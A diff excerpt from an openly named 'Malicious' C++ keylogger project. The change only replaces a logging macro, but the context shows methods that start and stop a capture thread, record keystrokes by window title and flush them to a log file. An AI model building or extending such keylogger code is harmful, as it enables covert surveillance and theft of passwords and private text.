@@ -165,7 +165,7 @@ namespace Malicious
             
     void Keylogger::start()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         // on ne démarre le keylogger uniquement s'il n'est pas déjà actif
         if(!isActivated)
         {
@@ -181,7 +181,7 @@ namespace Malicious
             
     void Keylogger::stop()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         if(isActivated)
         {
             if(!TerminateThread(hThread, 0))
@@ -205,7 +205,7 @@ namespace Malicious
     
     void Keylogger::flush()
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         log.open(log_file.c_str(), std::ios::app);
         if(log)
         {
@@ -235,7 +235,7 @@ namespace Malicious
     
     void Keylogger::addKey(const char key)
     {
-        FUNC_LOG(__FUNCTION__);
+        TRACE_FUNCTION
         updateWindowTitle();
         log_buffer[window] += key;
 		buffered_char++;
